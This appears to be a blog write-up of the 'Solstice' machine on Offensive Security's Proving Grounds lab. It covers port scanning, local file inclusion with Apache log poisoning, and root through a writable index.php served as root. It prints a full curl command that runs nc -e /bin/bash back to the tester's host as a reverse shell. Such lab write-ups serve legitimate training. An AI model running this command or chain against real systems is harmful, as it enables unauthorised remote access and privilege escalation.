---
layout: post
title: Proving Grounds - Solstice
---

### Summary

Solstice is a Linux box that is available on [Offensive Security's Proving Grounds](https://www.offensive-security.com/labs/individual/).  It's rated as an Easy box, and rightfully so.  There were a few rabbit holes, but if you considered all the variables before going down the rabbit hole, you would successfully avoid them.

*Initial foothold:* LFI

*Privilege Escalation:* File permissions

### Recon

I started off with a port scan.  I make use of [rustscan](https://github.com/RustScan/RustScan).

I have this alias set up in my .zshrc file:

```bash
portscan() {
        sudo rustscan -t 10000 -a $1 --ulimit 10000 -- -Pn -sC -sV -oA nmap/rustscan-$1
}
```

```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.143.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWAl1JMEsT6kbFmhkFFIZbd2aH3DuBpmLjo1MvWSSFsUlQ+rN9wQ8y469ng7vKZDx19ke+JZ9jUcuJAu4zQ6BHjHDcLTy44WJCESD4oACMCK6+tlMneuINf6KTMr3urfvkvlULi2ffNbMl6Ko9gS/Oqh8Cm9HyAXGTK5MVgmW39QFTXdn7ByQMnnXjKmJ+5nXbf9c9Al9JJCFQAe0irCq2w3ubylh83SwPWsunapn0pW8Czsm2nsFL6aRXCOoNeK7/GmcC8lqENMnUIVRauhpDR3radZ4Uv4ejzHL8H+IklpgVRqBiuzRiqHpGlotNYadcArbYZ4auDwibrtRwgTlD
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9EuXzK3hXcn3ml6Kj69Bo1DACMk1AZWWm9wgPGIyPBQyQLXLazAtoqEP1phT1BNmtyAvScCwsydQwUsRH/3vA=
|   256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATUyTSmh1Tep0cnIVXvQBD6IQTjI8TBEmQEba1Fzkv2
25/tcp    open  smtp    syn-ack ttl 63 Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.143], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2121/tcp  open  ftp     syn-ack ttl 63 pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.143.72:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
8593/tcp  open  http    syn-ack ttl 63 PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http    syn-ack ttl 63 PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  ftp     syn-ack ttl 63 FreeFloat ftpd 1.00
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

### HTTP - Port 8593

On the second HTTP port, 8593, I found a bit more to work with than with the service running on port 80.

![](/assets/2021-06-23-11-46-34.png)

I also discovered LFI injection possible on the `book` parameter.

![](/assets/2021-06-23-11-47-42.png)

I made sure I could access the Apache log file, to try log poisoning.

![](/assets/2021-06-23-11-48-35.png)

I made a request to inject some PHP code into the log file.

![](/assets/2021-06-23-11-49-07.png)

As I had been doing a lot of HTTP fuzzing, the access log was huge.  So I made a quick ping command to test that I actually have command execution.  There was a successful ping back.

![](/assets/2021-06-23-11-50-01.png)

![](/assets/2021-06-23-11-50-06.png)

### Initial foothold

From here it was easy to get a reverse shell.

```bash
curl "http://192.168.143.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=nc%20192.168.49.143%204444%20-e%20/bin/bash"
```

![](/assets/2021-06-23-11-51-49.png)

### Privilege Escalation

Making use of [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) I was able to see that there is a custom web application running on local port 57.

![](/assets/2021-06-23-11-53-32.png)

I also noticed that the service running on this port was starting up from the /var/tmp/sv directory.

![](/assets/2021-06-23-12-01-14.png)

As the service was being run as `root`, and I had write access to the `index.php` file, I decided to add in code that should run as root.

![](/assets/2021-06-23-12-02-19.png)

I used curl to access this service, to trigger the code in `index.php`.

![](/assets/2021-06-23-12-02-49.png)

The `bash` file was successfully copied and made SUID.

![](/assets/2021-06-23-12-03-08.png)